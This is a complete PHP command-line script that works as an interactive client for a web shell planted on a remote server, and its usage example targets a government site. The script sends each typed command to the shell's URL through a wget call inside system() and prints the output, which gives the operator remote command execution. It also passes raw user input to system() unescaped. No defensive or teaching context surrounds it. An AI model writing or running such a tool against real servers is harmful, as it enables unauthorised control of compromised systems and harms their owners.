#!/usr/bin/php
<?php
# ixa        
# run in Linux shell                                   # run in linux shell
# rip indentation
$white = "\e[97m";
$green  = "\e[92m";
$yellow = "\e[93m";
$bold   = "\e[1m";
$grey = "\e[37m";
$red = "\e[91m";
if (!isset($argv[1]) OR !preg_match('/ ?php| =/', $argv[1]))
{
echo $yellow.$bold."\nphp shell.php <poc>\n".$grey;
echo $yellow.$bold."exemple : php shell.php https://www.nsa.gov/shell.php?cmd=\n\n".$grey;
}
else
{
$ok = $argv[1];
echo $yellow.$bold."\n                                START THE GAME  ";

sleep(1);print $green.".";sleep(1);print $red.".";sleep(1);print $white.".";sleep(1)."\n";
echo chr(27).chr(91).'H'.chr(27).chr(91).'J';
echo "file : ", $yellow.$bold.$argv[0].$grey;
echo "\nshell access : ", $yellow.$bold.$ok.$grey;
echo "\n[type \"exit\" to exit the shell]\n\n";
for($i=1;$i<999999;$i++)
{
echo $red."$ ".$grey;
$choix = trim(fgets(STDIN));
if ($choix == "exit")
{
echo "bye\n";
break;
}
else {
$all = $ok.$choix;
echo system("wget -qO- $all");
echo "\n";
}
}
}
?>
